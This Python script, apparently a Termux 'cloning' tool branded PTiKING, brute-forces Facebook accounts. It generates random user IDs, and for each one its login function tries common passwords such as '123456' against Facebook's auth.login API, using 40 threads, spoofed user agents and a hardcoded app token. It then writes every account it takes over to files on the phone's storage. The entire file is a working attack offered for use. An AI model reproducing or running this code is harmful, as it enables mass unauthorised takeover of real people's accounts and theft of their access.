import random
import requests
import sys
import time
import datetime
from datetime import datetime, date
import os
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import getpass


akash="""
 ===================
 DECODE BY : PTiKING
 FACEBOOK : PTiKING 
 TELEGRAM Channel : @ArmanTool99281_bot
 =================== """
print(akash);time.sleep(1)


sys.stdout.write('\x1b]2; 𓆩🀪💚【PTi᭄】㊝𓆪 🔥 \x07')

def request_storage_permission():
    try:
        open('/sdcard/@PTi KING', 'w').write(' ')
    except Exception as e:
        print(e)
        print('\x1b[1;93m Allow Termux Permissions! And Run Again ')
        os.system('termux-setup-storage')

directories = ['/sdcard/PTiKING', '/sdcard/Md-ALAMGIR', '/sdcard/PTiKING/Im-PTiKING']
for folder_path in directories:
    try:
        os.makedirs(folder_path, exist_ok=True)
    except Exception as e:
        print(f'An error occurred while creating {folder_path}: {e}')

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('/sdcard/.proxy.txt', 'w').write(prox)
except Exception as e:
    print('')
    prox = open('/sdcard/.proxy.txt', 'r').read().splitlines()

successfull = []
G = '\x1b[1;92m'
W = '\x1b[0;97m'
Y = '\x1b[1;93m'
B = '\x1b[1;90m'
x = f'{G}➤{W}➤'
xy1 = f'{G}•{W}•'
xy = f'{G}━{W}➤'
ALAMGIR = f'{B}[{G}━{W}]'
op1 = f'{W}|{G}1{W}|'
op2 = f'{W}|{G}2{W}|'
op0 = f'{W}|{G}0{W}|'
ch = f'{W}|{G}?{W}|'

def line():
    print(f"{W}───────────────────────────────────────────────")

_month_ = {
    '1': 'January', '2': 'February', '3': 'March', '4': 'April',
    '5': 'May', '6': 'June', '7': 'July', '8': 'August',
    '9': 'September', '10': 'October', '11': 'November', '12': 'December'
}
date = datetime.now().day
month = _month_[str(datetime.now().month)]
year = datetime.now().year
date_and_year = f"{str(date)}\x1b[1;90m-\x1b[1;92m{str(month)}\x1b[1;90m-\x1b[1;92m{str(year)}"

def Banner():
    if 'Linux' in sys.platform.capitalize():
        os.system('clear')
    else:
        os.system('cls')
    return  """  

 ██████╗ ████████╗██╗
██╔══██╗╚══██╔══╝██║
██████╔╝   ██║   ██║
██╔═══╝    ██║   ██║
██║        ██║   ██║
╚═╝        ╚═╝   ╚═╝
                                                

"""

attemps = 0
while attemps < 12345677901:
    username = input(' \x1b[0;92mEnter Username: ')
    password = input(' \x1b[0;93mEnter Password: ')
    if username == 'PTi' and password == 'KING':
        print(' \x1b[0;92mYou Have Successfully Logged in.')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
os.system('clear')

def creationyear(uid):
    if len(uid) == 15:
        if uid[:10] in ('1000000000',): Md_dgk = '2009'
        elif uid[:9] in ('100000000',): Md_dgk = '2009'
        elif uid[:8] in ('10000000',): Md_dgk = '2009'
        elif uid[:7] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'): Md_dgk = '2009'
        elif uid[:7] in ('1000006', '1000007', '1000008', '1000009'): Md_dgk = '2010'
        elif uid[:6] in ('100001',): Md_dgk = '2010'
        elif uid[:6] in ('100002', '100003'): Md_dgk = '2011'
        elif uid[:6] in ('100004',): Md_dgk = '2012'
        elif uid[:6] in ('100005', '100006'): Md_dgk = '2013'
        elif uid[:6] in ('100007', '100008'): Md_dgk = '2014'
        elif uid[:6] in ('100009',): Md_dgk = '2015'
        elif uid[:5] in ('10001',): Md_dgk = '2016'
        elif uid[:5] in ('10002',): Md_dgk = '2017'
        elif uid[:5] in ('10003',): Md_dgk = '2018'
        elif uid[:5] in ('10004',): Md_dgk = '2019'
        elif uid[:5] in ('10005',): Md_dgk = '2020'
        elif uid[:5] in ('10006',): Md_dgk = '2021'
        elif uid[:5] in ('10009',): Md_dgk = '2023'
        elif uid[:5] in ('10007', '10008'): Md_dgk = '2022'
        else: Md_dgk = ''
    elif len(uid) in (9, 10): Md_dgk = '2008'
    elif len(uid) == 8: Md_dgk = '2007'
    elif len(uid) == 7: Md_dgk = '2006'
    elif len(uid) == 14 and uid[:2] in ('61',): Md_dgk = '2024'
    else: Md_dgk = ''
    return Md_dgk

def ua2():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWALPTiKING')
    rx = random.randrange(1, 999)
    return f'Mozilla/5.0 (Windows NT {rr(9, 11)}; Win64; x64){aZ}{rx}{aZ}) AppleWebKit/537.36 (KHTML, like Gecko){rr(99, 149)}.0.{rr(4500, 4999)}.{rr(35, 99)} Chrome/{rr(99, 175)}.0.{rr(0, 5)}.{rr(0, 5)} Safari/537.36'

def generate_user_ids(limit=None):
    if limit:
        return [str(random.randint(111111111, 999999999)) for _ in range(limit)]
    return [str(random.randint(111111111, 999999999)) for _ in range(1000)]

def login(uid):
    try:
        session = requests.Session()
        for pw in ['123456', '1234567', '12345678', '123456789', '111111', '000000', '654321', '1234567890']:
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': ua2(),
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger',
            }
            params = {
                'format': 'json',
                'email': uid,
                'password': pw,
                'credentials_type': 'device_based_login_password',
                'generate_session_cookies': '1',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'meta_inf_fbmeta': '%20¤tly_logged_in_userid=0',
                'method': 'GET',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_caller_class': 'com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'fb_api_req_friendly_name': 'authenticate',
                'cpl': 'true',
            }
            response = session.get('https://b-api.facebook.com/method/auth.login', params=params, headers=headers).json()
            if 'session_key' in response or 'EAAA' in str(response):
                with open('/sdcard/ALAMGIR_old.txt', 'a') as file:
                    file.write(f'[PTiKING-OK🌺] {uid}|{pw}|{creationyear(uid)}')
                line()
                print(f'\r{xy1}{G} [PTiKING-OK🌺] {uid} | {pw} | {creationyear(uid)}')
                ProfileLink = f'https://www.facebook.com/profile.php?id={uid}'
                print(f'\r{x}{Y} PROFILE LINK {G}➤{G} {ProfileLink}')
                line()
                open('/sdcard/PTiKING/OLD-UID/PTiKING_old_uid_ok.txt', 'a').write(f'[IM-OK] {uid} | {pw} | {creationyear(uid)}\n')
                successfull.append(str(uid) + '|' + str(pw))
                break
            elif 'session_key' in response or 'Please Confirm Email' in str(response):
                with open('/sdcard/PTiKING_old.txt', 'a') as file:
                    file.write(f'[PTiKING-OK🌺] {uid}|{pw}|{creationyear(uid)}\n')
                print(f'\r{xy1}{G} [PTiKING-CP🌺] {uid} | {pw} | {creationyear(uid)}')
                ProfileLink = f'https://www.facebook.com/profile.php?id=100000448926163/profile.php?id={uid}'
                print(f'\r{xy1}{Y} PROFILE LINK {G}➤{G} {ProfileLink}')
                line()
                successfull.append(str(uid) + '|' + str(pw))
                break
        sys.stdout.write(f'\r\x1b[0;97m[\x1b[1;92m{date_and_year}\x1b[0;97m] \x1b[38;5;208m{uid}{W}|{G}{len(successfull)}{W} ')
    except Exception as e:
        time.sleep(5)

def main():
    print(Banner())
    print(f'{op1} CLONE 2011-2015')
    print(f'{op2} CLONE 2009-2010')
    print(f'{op0} {G}CONTACT DEVELOPER')
    line()
    choice = input(f'{ch} Select : ')
    print(Banner())
    if choice in ('1', '01'):
        pti_king = '100000'
    else:
        pti_king = '100000'

    if pti_king == '100000':
        print(f'{x} EXAMPLE {G}:{W} 1000 {G}|{W} 2000 {G}|{W} 5000 {G}|{W} 10000')
        line()
        limit = int(input(f'{ch} LIMIT {G}:{W} '))
        user_ids = generate_user_ids(limit)
    else:
        user_ids = generate_user_ids()

    print(Banner())
    print(f'{x} OK/CP IDS WILL BE SAVED IN {xy} /SDCARD')
    line()
    print(f'{x} TOTAL UID {xy} {len(user_ids)}')
    line()
    with ThreadPool(max_workers=40) as pool:
        pool.map(login, [pti_king + uid for uid in user_ids])
    print()
    line()
    print(f'{x} PROGRAM FINISHED.')
    print(f'{x} TOTAL OK: {str(len(successfull))}/{str(len(successfull))}')
    line()
    input(' [ Press enter to back ]')
    main()

if __name__ == '__main__':
    main()
